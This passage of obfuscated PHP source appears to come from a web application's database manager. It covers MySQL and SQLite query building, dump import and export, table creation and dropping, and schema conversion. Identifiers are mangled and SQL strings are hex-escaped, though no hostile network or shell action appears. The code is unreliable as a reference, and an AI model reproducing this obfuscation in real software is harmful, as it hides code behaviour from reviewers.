$°ÃÍÄ˘â[12]), $this->parseWhere(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[363]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[363]] : $°ÃÍÄ˘â[12]), $this->parseGroup(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[589]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[589]] : $°ÃÍÄ˘â[12]), $this->parseHaving(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[1150]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[1150]] : $°ÃÍÄ˘â[12]), $this->parseOrder(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[452]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[452]] : $°ÃÍÄ˘â[12]), $this->parseLimit(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[378]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[378]] : $°ÃÍÄ˘â[12]), $this->parseUnion(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[433]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[433]] : $°ÃÍÄ˘â[12]), $this->parseComment(!empty($˙Èﬂ…Ïê[$°ÃÍÄ˘â[440]]) ? $˙Èﬂ…Ïê[$°ÃÍÄ˘â[440]] : $°ÃÍÄ˘â[12])), $ıæÇ±‡°); return $ıæÇ±‡°; } public function getLastSql($€Õá§∫™ = '') { return $€Õá§∫™ ? $this->modelSql[$€Õá§∫™] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($áΩÿ√™∫) { return addslashes($áΩÿ√™∫); } public function setModel($˛¬à¨˝–) { $this->model = $˛¬à¨˝–; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($∆å°”æò = array()) { $ ﬁ®ëÒ› =& $_SERVER[ˆë€Ï⁄∂]; if (empty($∆å°”æò)) { $∆å°”æò = $GLOBALS[$ ﬁ®ëÒ›[6]][$ ﬁ®ëÒ›[21]]; } $this->database = $∆å°”æò; } public function model($Éﬁ©Üµ∂ = '') { return new ModelBase($Éﬁ©Üµ∂, $_SERVER[ˆë€Ï⁄∂][12], $this->database); } public function db($õíúªËÀ = false) { $ËŒïÚµ› =& $_SERVER[ˆë€Ï⁄∂]; $òÄıÓ±‹ = array_change_key_case($this->database); if ($this->dbType() == $ËŒïÚµ›[13] || !$õíúªËÀ) { return $this->model()->db(); } $±Û∑ÜÏ = $òÄıÓ±‹[$ËŒïÚµ›[1064]]; $òÄıÓ±‹[$ËŒïÚµ›[1064]] = $ËŒïÚµ›[12]; if ($òÄıÓ±‹[$ËŒïÚµ›[1059]] == $ËŒïÚµ›[1056]) { $ï¥¡ÜÂ¬ = $òÄıÓ±‹[$ËŒïÚµ›[1065]]; $òÄıÓ±‹[$ËŒïÚµ›[1065]] = substr($ï¥¡ÜÂ¬, 0, strrpos($ï¥¡ÜÂ¬, $ËŒïÚµ›[1151])); } $this->database = $òÄıÓ±‹; $≈ìÕ¨û¢ = $this->model()->db(); try { $Œ‰Êœ¡≠ = $≈ìÕ¨û¢->execute("\x73\x68\157\x77\x20\x64\x61\164\141\142\141\x73\145\x73\x20\x6c\x69\153\x65\x20\x27{$±Û∑ÜÏ}\47"); } catch (Exception $÷˙í–Œ´) { } if (!$Œ‰Êœ¡≠) { $≈ìÕ¨û¢->execute("\x63\x72\x65\x61\164\145\40\x64\x61\x74\x61\x62\141\163\145\40\x60{$±Û∑ÜÏ}\x60"); } $òÄıÓ±‹[$ËŒïÚµ›[1064]] = $±Û∑ÜÏ; if ($òÄıÓ±‹[$ËŒïÚµ›[1059]] == $ËŒïÚµ›[1056]) { $òÄıÓ±‹[$ËŒïÚµ›[1065]] .= $ËŒïÚµ›[1151] . $±Û∑ÜÏ; } $this->database = $òÄıÓ±‹; $≈ìÕ¨û¢->execute("\x75\x73\145\x20\140{$±Û∑ÜÏ}\x60"); return $≈ìÕ¨û¢; } public function createTable($¨ìú‚”», &$™”®û” ) { $ìàÒ®ƒì =& $_SERVER[ˆë€Ï⁄∂]; if (!IO::exist($¨ìú‚”»)) { ActionCall($ìàÒ®ƒì[1152], !0, 0); show_json(LNG($ìàÒ®ƒì[1153]), !1); } $›µΩê¡Ù = $this->model()->db(); $‘§¶—≥ = sqlSplit(IO::getContent($¨ìú‚”»)); foreach ($‘§¶—≥ as $ù´Ë∞√—) { $œ°ñ’Ê√ = stripos($ù´Ë∞√—, $ìàÒ®ƒì[1154]) === 0; if ($œ°ñ’Ê√) { $™”®û” ->task[$ìàÒ®ƒì[1155]] += 1; } $›µΩê¡Ù->execute($ù´Ë∞√—); if ($œ°ñ’Ê√) { preg_match($ìàÒ®ƒì[1156], $ù´Ë∞√—, $£À˙¢ã¯); $™”®û” ->task[$ìàÒ®ƒì[1157]] = $£À˙¢ã¯[1]; $™”®û” ->update(1); } } } public function insertTable($¯ƒ®ì˝µ, &$ÜÜÓÿÒ€) { $¬®Ø™é¨ =& $_SERVER[ˆë€Ï⁄∂]; $´∏˙âŒï = $this->model()->db(); $ùø∞≤»Ç = $ìë∞Å—Ã ? array($ìë∞Å—Ã) : $´∏˙âŒï->getTables(); foreach ($¯ƒ®ì˝µ as $™˝Ù∫◊») { $ìë∞Å—Ã = basename($™˝Ù∫◊», $¬®Ø™é¨[880]); if (!in_array($ìë∞Å—Ã, $ùø∞≤»Ç)) { continue; } $ÜÜÓÿÒ€->task[$¬®Ø™é¨[1157]] = $ìë∞Å—Ã; if (get_filesize($™˝Ù∫◊») == 0) { continue; } $•≠ É¶œ = $this->sqlToDb($™˝Ù∫◊», $ÜÜÓÿÒ€); if (!$•≠ É¶œ) { ActionCall($¬®Ø™é¨[1152], !0, 0); show_json(LNG($¬®Ø™é¨[1158]) . "\x5b{$ìë∞Å—Ã}\135", !1); } } } public function sqlFromDb($µ‚⁄ÊïÁ, $Ï™¸úŸà, &$π—€éåØ, $Ñ˛•π«¶ = '') { if ($π—€éåØ) { $π—€éåØ->task[$_SERVER[ˆë€Ï⁄∂][1157]] = $µ‚⁄ÊïÁ; } $¥ÿ∞ôºÅ = $this->model($µ‚⁄ÊïÁ); $üâé≈∑‚ = 0; $Ù˚∑ë•˝ = 0; $µ⁄ﬁÀº¸ = 10000; $Û¥¡ã¿ƒ = fopen($Ï™¸úŸà, $_SERVER[ˆë€Ï⁄∂][1159]); $â⁄ÙÂöî = $¥ÿ∞ôºÅ->getPk(); $±˙å≥Ω» = $¥ÿ∞ôºÅ->getDbFields(); $°¸–ìÑØ = $_SERVER[ˆë€Ï⁄∂][12]; if ($GLOBALS[$_SERVER[ˆë€Ï⁄∂][879]] && in_array($µ‚⁄ÊïÁ, array($_SERVER[ˆë€Ï⁄∂][1160], $_SERVER[ˆë€Ï⁄∂][1161]))) { $°¸–ìÑØ = $µ‚⁄ÊïÁ; } do { $£ôï¥ıÔ = array($â⁄ÙÂöî => array($_SERVER[ˆë€Ï⁄∂][1106], $Ù˚∑ë•˝)); $üÉŸÈ¥ü = $¥ÿ∞ôºÅ->where($£ôï¥ıÔ)->field($±˙å≥Ω»)->order($â⁄ÙÂöî . $_SERVER[ˆë€Ï⁄∂][1162])->limit($µ⁄ﬁÀº¸)->select(); $üÉŸÈ¥ü = !empty($üÉŸÈ¥ü) ? $üÉŸÈ¥ü : array(); if (!($õºÚë¥ﬁ = count($üÉŸÈ¥ü))) { break; } $ÔÉá™∑◊ = end($üÉŸÈ¥ü); $Ù˚∑ë•˝ = $ÔÉá™∑◊[$â⁄ÙÂöî]; $˙éÄÂËÇ = array(); foreach ($üÉŸÈ¥ü as $«ÃÈó≠€) { if ($°¸–ìÑØ) { if ($µ‚⁄ÊïÁ == $_SERVER[ˆë€Ï⁄∂][1160]) { if ($«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][33]] == $_SERVER[ˆë€Ï⁄∂][1163]) { $ﬁÎæ¸–Ø = json_decode($«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][461]], !0); if ($ﬁÎæ¸–Ø[$_SERVER[ˆë€Ï⁄∂][32]] == $GLOBALS[$_SERVER[ˆë€Ï⁄∂][879]] && $ﬁÎæ¸–Ø[$_SERVER[ˆë€Ï⁄∂][841]] != 1) { continue; } } } else { if ($«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][33]] == $_SERVER[ˆë€Ï⁄∂][1164] && $«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][107]] == $_SERVER[ˆë€Ï⁄∂][874]) { continue; } } } if ($Ñ˛•π«¶) { $«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][97]] = "\173\x69\157\72{$Ñ˛•π«¶}\x7d" . substr($«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][97]], strlen("\173\x69\x6f\x3a{$«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][909]]}\x7d")); $«ÃÈó≠€[$_SERVER[ˆë€Ï⁄∂][909]] = $Ñ˛•π«¶; } $˙éÄÂËÇ[] = $_SERVER[ˆë€Ï⁄∂][1165] . $this->sqlEncode($«ÃÈó≠€) . $_SERVER[ˆë€Ï⁄∂][1166]; } $ˆ«üè¥î = "\111\x4e\123\x45\x52\124\x20\111\116\x54\x4f\x20\x60{$µ‚⁄ÊïÁ}\140\x20\50\x60" . implode($_SERVER[ˆë€Ï⁄∂][1167], $±˙å≥Ω») . $_SERVER[ˆë€Ï⁄∂][1168]; fwrite($Û¥¡ã¿ƒ, $ˆ«üè¥î . implode($_SERVER[ˆë€Ï⁄∂][1169], $˙éÄÂËÇ) . $_SERVER[ˆë€Ï⁄∂][84] . PHP_EOL); $üâé≈∑‚ += $õºÚë¥ﬁ; if ($π—€éåØ) { $π—€éåØ->update($õºÚë¥ﬁ); } } while ($µ⁄ﬁÀº¸ == $õºÚë¥ﬁ); fclose($Û¥¡ã¿ƒ); return $üâé≈∑‚; } public function sqlToDb($∆ÚØÓê√, &$˚º…ÉÅ) { $ÊÍòèÕ =& $_SERVER[ˆë€Ï⁄∂]; $ºé’∂ˆ˜ = $this->model()->db(); $‡ëíÒ‰™ = @fopen($∆ÚØÓê√, $ÊÍòèÕ[1170]); if (!$‡ëíÒ‰™) { return !1; } $¿“´«Ω– = 0; $ë¬‹≠–Á = $ÊÍòèÕ[12]; $Î¸ÿœóß = array(); $™˙€˘òâ = $this->dbType(); $êÃä˚ÇÑ = $™˙€˘òâ == $ÊÍòèÕ[13] ? 500 : 2000; $ÇıØô˛Û = basename($∆ÚØÓê√, $ÊÍòèÕ[880]); $£˚˘Ã©ô = 0; $ﬂ®£ÛÚç = 4194304; while (!feof($‡ëíÒ‰™)) { $Öõèñ≥ê = trim(fgets($‡ëíÒ‰™)); if (!$Öõèñ≥ê) { continue; } $˜ÂÍàÛõ = $this->sqlDecode($Öõèñ≥ê, $™˙€˘òâ, $ÇıØô˛Û); if (stripos($˜ÂÍàÛõ, $ÊÍòèÕ[441]) === 0) { if (!$ë¬‹≠–Á) { $ë¬‹≠–Á = $˜ÂÍàÛõ . $ÊÍòèÕ[53]; } continue; } if ($˚º…ÉÅ) { $˚º…ÉÅ->task[$ÊÍòèÕ[1155]] += 1; } $¿“´«Ω–++; $Î¸ÿœóß[] = rtrim(rtrim(trim($˜ÂÍàÛõ), $ÊÍòèÕ[50]), $ÊÍòèÕ[84]); $ï≠€á´∫ = null; $ÔÁ‹⁄ôÅ = strlen($˜ÂÍàÛõ); $£˚˘Ã©ô += $ÔÁ‹⁄ôÅ; $Èê–‰Â∆ = strlen($ë¬‹≠–Á) + $£˚˘Ã©ô + (count($Î¸ÿœóß) - 1); if ($Èê–‰Â∆ >= $ﬂ®£ÛÚç) { $ï≠€á´∫ = array_pop($Î¸ÿœóß); if ($¿“´«Ω– > 1) { $¿“´«Ω–--; } } if ($¿“´«Ω– >= $êÃä˚ÇÑ || $ï≠€á´∫) { $˜ÂÍàÛõ = $ë¬‹≠–Á . implode($ÊÍòèÕ[50], $Î¸ÿœóß); if (!$ºé’∂ˆ˜->execute($˜ÂÍàÛõ)) { return !1; } if ($˚º…ÉÅ) { $˚º…ÉÅ->update($¿“´«Ω–); } $Î¸ÿœóß = array(); $¿“´«Ω– = 0; $£˚˘Ã©ô = 0; if ($ï≠€á´∫) { $Î¸ÿœóß = array($ï≠€á´∫); $¿“´«Ω– = 1; $£˚˘Ã©ô = $ÔÁ‹⁄ôÅ; } } } fclose($‡ëíÒ‰™); if (!empty($Î¸ÿœóß)) { $˜ÂÍàÛõ = $ë¬‹≠–Á . implode($ÊÍòèÕ[50], $Î¸ÿœóß); if (!$ºé’∂ˆ˜->execute($˜ÂÍàÛõ)) { return !1; } if ($˚º…ÉÅ) { $˚º…ÉÅ->update($¿“´«Ω–); } } return !0; } public function dropTable($˚…î¯â„ = null) { $ôû ﬁﬂ‘ = $this->model()->db(); $Ñ∆˜†ç = $˚…î¯â„ ? array($˚…î¯â„) : $ôû ﬁﬂ‘->getTables(); if (!$Ñ∆˜†ç) { return; } foreach ($Ñ∆˜†ç as $˚…î¯â„) { if ($˚…î¯â„) { $˚…î¯â„ = strtolower($˚…î¯â„); } else { continue; } $ôû ﬁﬂ‘->execute("\144\162\x6f\160\x20\164\x61\x62\x6c\x65\40\151\146\x20\x65\x78\151\163\164\x73\x20\x60{$˚…î¯â„}\140"); } } private function sqlEncode($˚ÅçõÆå) { $°ÒÔø£è =& $_SERVER[ˆë€Ï⁄∂]; $∑’Ÿäß∑ = array(); foreach ($˚ÅçõÆå as $¶ÿ—˜∏…) { if (is_array($¶ÿ—˜∏…)) { $¶ÿ—˜∏… = json_encode_force($¶ÿ—˜∏…); } $¶ÿ—˜∏… = addslashes($¶ÿ—˜∏…); $¶ÿ—˜∏… = str_replace(array($°ÒÔø£è[1171], $°ÒÔø£è[59], $°ÒÔø£è[428]), array($°ÒÔø£è[1172], $°ÒÔø£è[1173], $°ÒÔø£è[1174]), $¶ÿ—˜∏…); $∑’Ÿäß∑[] = $¶ÿ—˜∏…; } return $°ÒÔø£è[68] . implode($°ÒÔø£è[1175], $∑’Ÿäß∑) . $°ÒÔø£è[68]; } private function sqlDecode($—àÍõâ˙, $™ÑüÌ◊∏, $ôí∆« ∆ = '') { $¯Ë’›ï‘ =& $_SERVER[ˆë€Ï⁄∂]; $—àÍõâ˙ = str_replace(array($¯Ë’›ï‘[1172], $¯Ë’›ï‘[1173], $¯Ë’›ï‘[1174]), array($¯Ë’›ï‘[1171], $¯Ë’›ï‘[59], $¯Ë’›ï‘[428]), $—àÍõâ˙); if ($™ÑüÌ◊∏ == $¯Ë’›ï‘[13]) { $—àÍõâ˙ = str_ireplace($¯Ë’›ï‘[1176], $¯Ë’›ï‘[69], $—àÍõâ˙); $—àÍõâ˙ = stripslashes($—àÍõâ˙); } return preg_replace($¯Ë’›ï‘[1177], $¯Ë’›ï‘[12], $—àÍõâ˙); if ($™ÑüÌ◊∏ == $¯Ë’›ï‘[13]) { return $ôí∆« ∆ != $¯Ë’›ï‘[873] ? stripslashes($—àÍõâ˙) : $—àÍõâ˙; } if ($ôí∆« ∆ == $¯Ë’›ï‘[873]) { $—àÍõâ˙ = str_replace($¯Ë’›ï‘[1178], $¯Ë’›ï‘[131], stripslashes($—àÍõâ˙)); } return $—àÍõâ˙; } public function getSqlFile($¿ãø‘èö = '') { $•œ”áé˘ =& $_SERVER[ˆë€Ï⁄∂]; $Â¬”ñ§Ò = $this->dbType(!0); $ï®˚Ìµ™ = CONTROLLER_DIR . "\151\156\163\x74\141\154\154\x2f\144\141\x74\141\x2f{$Â¬”ñ§Ò}\56\163\x71\x6c"; $Õ≈—Áåò = file_get_contents($ï®˚Ìµ™); $‰»∆∂Æ¢ = $•œ”áé˘[1179] . ($Â¬”ñ§Ò == $•œ”áé˘[896] ? $•œ”áé˘[1180] : $•œ”áé˘[1181]) . $•œ”áé˘[1182]; preg_match_all($‰»∆∂Æ¢, $Õ≈—Áåò, $∫í¨ÙÀı); $‹ì√‡¬ª = $∫í¨ÙÀı[1]; $Ø˚ÍÿÍ‹ = $this->model()->db(); $¡ú˝õÄø = $Ø˚ÍÿÍ‹->getTables(); $ÎÓ®ˆ…Ô = TEMP_FILES . $•œ”áé˘[1183] . date($•œ”áé˘[271]) . $•œ”áé˘[8]; del_dir($ÎÓ®ˆ…Ô); mk_dir($ÎÓ®ˆ…Ô); $‰«∑ıãë = $ÎÓ®ˆ…Ô . $•œ”áé˘[1184]; $æ≤≤ªõå = $ÎÓ®ˆ…Ô . $•œ”áé˘[1185]; $òÖı©› = $Â¬”ñ§Ò == $•œ”áé˘[13] ? $•œ”áé˘[896] : $•œ”áé˘[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\x6c\x6c\x2f\x64\141\x74\x61\x2f{$òÖı©›}\x2e\x73\161\154", $ÎÓ®ˆ…Ô); @touch($ÎÓ®ˆ…Ô . $Â¬”ñ§Ò . $•œ”áé˘[880]); $çöÇÈ⁄Ÿ = fopen($‰«∑ıãë, $•œ”áé˘[1159]); $€ïÅÓ£— = fopen($æ≤≤ªõå, $•œ”áé˘[1159]); if ($Â¬”ñ§Ò == $•œ”áé˘[13]) { $¡ú˝õÄø = array_diff($¡ú˝õÄø, array($•œ”áé˘[871], $•œ”áé˘[872])); $Öàñ‹éè = array($•œ”áé˘[1186], $•œ”áé˘[1187], $•œ”áé˘[1188]); fwrite($€ïÅÓ£—, implode(PHP_EOL, $Öàñ‹éè) . PHP_EOL . PHP_EOL); foreach ($¡ú˝õÄø as $ÚÄáÓ¿È) { $´·à±ï• = $this->sqlFromSqlite($ÚÄáÓ¿È); if (!$´·à±ï•[$•œ”áé˘[13]]) { continue; } fwrite($€ïÅÓ£—, $´·à±ï•[$•œ”áé˘[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÚÄáÓ¿È, $‹ì√‡¬ª)) { fwrite($çöÇÈ⁄Ÿ, $´·à±ï•[$•œ”áé˘[896]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¡ú˝õÄø as $ÚÄáÓ¿È) { $´·à±ï• = $this->sqlFromMysql($ÚÄáÓ¿È); if (!$´·à±ï•[$•œ”áé˘[896]]) { continue; } fwrite($çöÇÈ⁄Ÿ, $´·à±ï•[$•œ”áé˘[896]] . PHP_EOL . PHP_EOL); if (!in_array($ÚÄáÓ¿È, $‹ì√‡¬ª)) { fwrite($€ïÅÓ£—, $´·à±ï•[$•œ”áé˘[13]] . PHP_EOL . PHP_EOL); } } } fclose($çöÇÈ⁄Ÿ); fclose($€ïÅÓ£—); $Õ≈—Áåò = array($•œ”áé˘[896] => $‰«∑ıãë, $•œ”áé˘[13] => $æ≤≤ªõå); return $¿ãø‘èö ? $Õ≈—Áåò[$¿ãø‘èö] : $Õ≈—Áåò; } public function dbType($ÔÎ•ù†π = false) { $¨œﬁàÊ” =& $_SERVER[ˆë€Ï⁄∂]; $Õ÷Ù¸√ã = $ÔÎ•ù†π ? $GLOBALS[$¨œﬁàÊ”[6]][$¨œﬁàÊ”[21]] : $this->database; $Õ÷Ù¸√ã = array_change_key_case($Õ÷Ù¸√ã); $≥Ô⁄‹á˛ = $Õ÷Ù¸√ã[$¨œﬁàÊ”[1059]]; if ($≥Ô⁄‹á˛ == $¨œﬁàÊ”[1056]) { $ëóÈ—Ñ£ = explode($¨œﬁàÊ”[4], $Õ÷Ù¸√ã[$¨œﬁàÊ”[1065]]); $≥Ô⁄‹á˛ = $ëóÈ—Ñ£[0]; } $√¢ª—Ø≈ = array($¨œﬁàÊ”[1189] => $¨œﬁàÊ”[13], $¨œﬁàÊ”[1004] => $¨œﬁàÊ”[896]); if (isset($√¢ª—Ø≈[$≥Ô⁄‹á˛])) { $≥Ô⁄‹á˛ = $√¢ª—Ø≈[$≥Ô⁄‹á˛]; } return $≥Ô⁄‹á˛; } public function sqlFromMysql($‹«ñõ€å, $È„åﬁƒŸ = '') { $∞¶ãﬂ˛‰ =& $_SERVER[ˆë€Ï⁄∂]; $Ìˆ‡ÿÖ⁄ = $this->model()->db(); $ó≠∆£”∫ = $Ìˆ‡ÿÖ⁄->query($∞¶ãﬂ˛‰[1190] . $‹«ñõ€å . $∞¶ãﬂ˛‰[472]); if (!$ó≠∆£”∫ || !$ó≠∆£”∫[0]) { return !1; } $≤ÇÕÎè» = _get($ó≠∆£”∫[0], $∞¶ãﬂ˛‰[1191], $∞¶ãﬂ˛‰[12]); if (!$≤ÇÕÎè») { return !1; } $Ê»ÊÓ¸— = "\x44\122\117\x50\x20\x54\x41\x42\x4c\x45\40\x49\106\x20\x45\130\x49\123\x54\123\40\x60{$‹«ñõ€å}\x60\x3b" . PHP_EOL . $≤ÇÕÎè» . $∞¶ãﬂ˛‰[84]; if ($È„åﬁƒŸ && $È„åﬁƒŸ == $∞¶ãﬂ˛‰[896]) { return $Ê»ÊÓ¸—; } $Ë˝ñ–’‚ = array_change_key_case($GLOBALS[$∞¶ãﬂ˛‰[6]][$∞¶ãﬂ˛‰[21]]); $™ù®≤±Ì = $Ë˝ñ–’‚[$∞¶ãﬂ˛‰[1064]]; $Ì—™≠èô = $∞¶ãﬂ˛‰[1192] . $™ù®≤±Ì . $∞¶ãﬂ˛‰[1193] . $‹«ñõ€å . $∞¶ãﬂ˛‰[68]; $ü£◊‘∫· = $∞¶ãﬂ˛‰[1194] . $‹«ñõ€å . $∞¶ãﬂ˛‰[992]; $öŸ±Ã“ª = $Ìˆ‡ÿÖ⁄->query($Ì—™≠èô); if (empty($öŸ±Ã“ª)) { $˝≤Ñ«Ñ¬ = array($∞¶ãﬂ˛‰[896] => $∞¶ãﬂ˛‰[12], $∞¶ãﬂ˛‰[13] => $∞¶ãﬂ˛‰[12]); return $È„åﬁƒŸ ? $˝≤Ñ«Ñ¬[$È„åﬁƒŸ] : $˝≤Ñ«Ñ¬; } $ÓÃÌ⁄‚˚ = $Ìˆ‡ÿÖ⁄->query($ü£◊‘∫·); $±™¢Ùπ– = $∞¶ãﬂ˛‰[12]; $ÁÊº•±˜ = array(); foreach ($ÓÃÌ⁄‚˚ as $∞ÔàÂµÈ) { if (!$±™¢Ùπ– && $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1195]] == $∞¶ãﬂ˛‰[1196]) { $±™¢Ùπ– = $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1197]]; } if (isset($ÁÊº•±˜[$∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1195]]])) { $ÁÊº•±˜[$∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1195]]][$∞¶ãﬂ˛‰[1198]][] = $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1197]]; continue; } $ÁÊº•±˜[$∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1195]]] = array($∞¶ãﬂ˛‰[1199] => $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1195]], $∞¶ãﬂ˛‰[1198] => array($∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1197]]), $∞¶ãﬂ˛‰[1200] => $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1201]] == $∞¶ãﬂ˛‰[101] ? 0 : 1); } $æı‡¸∑ƒ = array(); foreach ($ÁÊº•±˜ as $∞ÔàÂµÈ) { $—ô∆Êú° = $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1199]] == $∞¶ãﬂ˛‰[1196]; $≤€·åÙÒ = array($∞¶ãﬂ˛‰[1202], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1200]] == $∞¶ãﬂ˛‰[101] && !$—ô∆Êú° ? $∞¶ãﬂ˛‰[1203] : $∞¶ãﬂ˛‰[12], $∞¶ãﬂ˛‰[1204], $∞¶ãﬂ˛‰[1205] . $‹«ñõ€å . $∞¶ãﬂ˛‰[11] . ($—ô∆Êú° ? $∞¶ãﬂ˛‰[1206] : $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1199]]) . $∞¶ãﬂ˛‰[131], $∞¶ãﬂ˛‰[1207], $∞¶ãﬂ˛‰[131] . $‹«ñõ€å . $∞¶ãﬂ˛‰[131], $∞¶ãﬂ˛‰[1208] . implode($∞¶ãﬂ˛‰[1209], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1198]]) . $∞¶ãﬂ˛‰[1210]); $æı‡¸∑ƒ[] = implode($∞¶ãﬂ˛‰[53], $≤€·åÙÒ) . $∞¶ãﬂ˛‰[84]; } $Ø∆ËÆ⁄Ω = array(); $¥”õ™” = array($∞¶ãﬂ˛‰[1211] => $∞¶ãﬂ˛‰[1212], $∞¶ãﬂ˛‰[1212] => $∞¶ãﬂ˛‰[1212], $∞¶ãﬂ˛‰[374] => $∞¶ãﬂ˛‰[401], $∞¶ãﬂ˛‰[373] => $∞¶ãﬂ˛‰[401]); foreach ($öŸ±Ã“ª as $∞ÔàÂµÈ) { $≤€·åÙÒ = array($∞¶ãﬂ˛‰[131] . $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1213]] . $∞¶ãﬂ˛‰[131], isset($¥”õ™”[$∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1214]]]) ? $¥”õ™”[$∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1214]]] : $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1215]], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1216]] == $∞¶ãﬂ˛‰[990] ? $∞¶ãﬂ˛‰[1217] : $∞¶ãﬂ˛‰[1218], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1213]] == $±™¢Ùπ– ? $∞¶ãﬂ˛‰[1219] : $∞¶ãﬂ˛‰[12], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1041]] ? strtoupper(str_replace($∞¶ãﬂ˛‰[11], $∞¶ãﬂ˛‰[12], $∞ÔàÂµÈ[$∞¶ãﬂ˛‰[1041]])) : $∞¶ãﬂ˛‰[12]); $Ø∆ËÆ⁄Ω[] = trim(implode($∞¶ãﬂ˛‰[53], $≤€·åÙÒ)); } $û∫ôÉñ´ = array($∞¶ãﬂ˛‰[1220] . $‹«ñõ€å . $∞¶ãﬂ˛‰[1221], $∞¶ãﬂ˛‰[1222] . $‹«ñõ€å . $∞¶ãﬂ˛‰[1223], implode($∞¶ãﬂ˛‰[50] . PHP_EOL, $Ø∆ËÆ⁄Ω), $∞¶ãﬂ˛‰[1038]); $ÒÂ”éÜß = implode(PHP_EOL, array_merge($û∫ôÉñ´, $æı‡¸∑ƒ)); if ($È„åﬁƒŸ && $È„åﬁƒŸ == $∞¶ãﬂ˛‰[13]) { return $ÒÂ”éÜß; } $˝≤Ñ«Ñ¬ = array($∞¶ãﬂ˛‰[896] => $Ê»ÊÓ¸—, $∞¶ãﬂ˛‰[13] => $ÒÂ”éÜß); return $È„åﬁƒŸ ? $˝≤Ñ«Ñ¬[$È„åﬁƒŸ] : $˝≤Ñ«Ñ¬; } public function sqlFromSqlite($Û⁄€ﬂ¯¢, $‚ √≠¨Ú = '') { $‘Æ–ıù® =& $_SERVER[ˆë€Ï⁄∂]; $›“Î±öÇ = $this->model()->db(); $ÛôéΩë… = "\120\x52\x41\x47\x4d\101\40\124\x41\102\114\x45\x5f\111\x4e\106\x4f\x20\50\x27{$Û⁄€ﬂ¯¢}\47\x29"; $∂ÎËà⁄€ = "\123\x45\x4c\x45\103\x54\x20\x2a\x20\106\122\117\x4d\40\163\161\154\151\164\145\x5f\x6d\x61\163\164\x65\x72\x20\127\x48\105\x52\105\40\x74\142\x6c\137\156\x61\155\145\40\x3d\x20\47{$Û⁄€ﬂ¯¢}\x27"; $Ïﬂ—¿≤Â = $›“Î±öÇ->query($ÛôéΩë…); if (empty($Ïﬂ—¿≤Â)) { $†Éª´´˙ = array($‘Æ–ıù®[896] => $‘Æ–ıù®[12], $‘Æ–ıù®[13] => $‘Æ–ıù®[12]); return $‚ √≠¨Ú ? $†Éª´´˙[$‚ √≠¨Ú] : $†Éª´´˙; } $¸§…Ì∏õ = $›“Î±öÇ->query($∂ÎËà⁄€); $Á∑ﬁÚ»ö = $›êâ»ƒœ = array(); foreach ($¸§…Ì∏õ as $∏•Ç˝»˚) { if ($∏•Ç˝»˚[$‘Æ–ıù®[33]] == $‘Æ–ıù®[367]) { $Á∑ﬁÚ»ö[] = $∏•Ç˝»˚[$‘Æ–ıù®[1224]]; } else { $›êâ»ƒœ[$∏•Ç˝»˚[$‘Æ–ıù®[32]]] = $∏•Ç˝»˚[$‘Æ–ıù®[1224]]; } } $ËÁÈòËÊ = array_merge(array($‘Æ–ıù®[1220] . $Û⁄€ﬂ¯¢ . $‘Æ–ıù®[131]), $Á∑ﬁÚ»ö, array_values($›êâ»ƒœ)); $ËÁÈòËÊ = implode($‘Æ–ıù®[84] . PHP_EOL, $ËÁÈòËÊ) . $‘Æ–ıù®[84]; if ($‚ √≠¨Ú && $‚ √≠¨Ú == $‘Æ–ıù®[13]) { return $ËÁÈòËÊ; } $»®ÅÉï∫ = array(); foreach ($›êâ»ƒœ as $÷ªœ§»ª => $à÷©íÛ∞) { $ÿﬂÛ“ﬁ™ = str_replace($‘Æ–ıù®[1225] . $Û⁄€ﬂ¯¢ . $‘Æ–ıù®[11], $‘Æ–ıù®[12], $÷ªœ§»ª); $ÿﬂÛ“ﬁ™ = str_replace($Û⁄€ﬂ¯¢ . $‘Æ–ıù®[11], $‘Æ–ıù®[12], $÷ªœ§»ª); $†Ë∫Ë‡˝ = str_replace(array($‘Æ–ıù®[131], $‘Æ–ıù®[1049]), $‘Æ–ıù®[472], substr($à÷©íÛ∞, stripos($à÷©íÛ∞, $‘Æ–ıù®[348]))); 